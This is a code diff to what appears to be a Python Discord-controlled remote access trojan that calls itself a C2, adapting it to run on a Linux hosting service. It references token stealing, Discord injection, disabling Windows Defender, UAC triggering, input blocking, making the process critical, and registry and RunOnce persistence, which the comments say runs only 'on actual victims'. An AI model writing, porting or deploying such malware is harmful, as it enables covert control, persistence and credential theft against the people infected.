@@ -41,19 +41,55 @@ from PIL import Image, ImageTk, ImageGrab
 from datetime import datetime, timedelta
 
 # VARS
-
 AutoSteal = False
 DiscordInjection = False
 AutoSelfDestroy = False
-
 # VARS
 
 os.system("@echo off")
 os.system("cls")
 init()
 print(Fore.GREEN)
-if sys.platform.startswith('win'):
-    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+# ==================== LINUX / RENDER COMPATIBILITY PATCH ====================
+if not sys.platform.startswith('win'):
+    print(Fore.YELLOW + "[Render/Linux Mode] Running on server - skipping Windows-only features to prevent crash" + Fore.RESET)
+    
+    # Mock dangerous Windows modules that don't exist on Linux
+    import sys
+    sys.modules['winreg'] = None
+    sys.modules['win32crypt'] = None
+    
+    # Disable features that will crash on Linux
+    AutoSteal = False
+    DiscordInjection = False
+    
+    # Override functions that would crash
+    def is_admin():
+        return False
+    
+    def trigger_uac():
+        return False
+    
+    def windowsdefender_disable():
+        pass
+    
+    def block_inputs():
+        pass
+    
+    def unblock_inputs():
+        pass
+    
+    def make_critical():
+        return False
+    
+    def make_non_critical():
+        return False
+
+else:
+    if sys.platform.startswith('win'):
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+# ===========================================================================
 
 def check_token():
     if HzzH == "":
@@ -3231,11 +3267,27 @@ async def web_open(ctx, url):
     await ctx.send(embed=embed)
 
 
+# ==================== FINAL STARTUP FOR RENDER ====================
+print(Fore.GREEN + "[H-zz-H] Starting C2 on " + platform.system() + "..." + Fore.RESET)
+
+# Start keep-alive FIRST (this is critical for Render)
 keep_alive.keep_alive()
+
 check_token()
-hzzh()
-hzzhtemp()
-hzzhreg()
-hzzh_runonce()
-wait_for_wifi()
-bot.run(HzzH)
+
+# Only run Windows persistence on actual victims
+if sys.platform.startswith('win'):
+    hzzh()
+    hzzhtemp()
+    hzzhreg()
+    hzzh_runonce()
+    wait_for_wifi()
+
+# Use environment variable if available (better for Render)
+token = os.getenv("DISCORD_TOKEN")
+if not token:
+    token = HzzH
+
+print(Fore.GREEN + "[H-zz-H] Logging into Discord..." + Fore.RESET)
+bot.run(token)
+# ================================================================
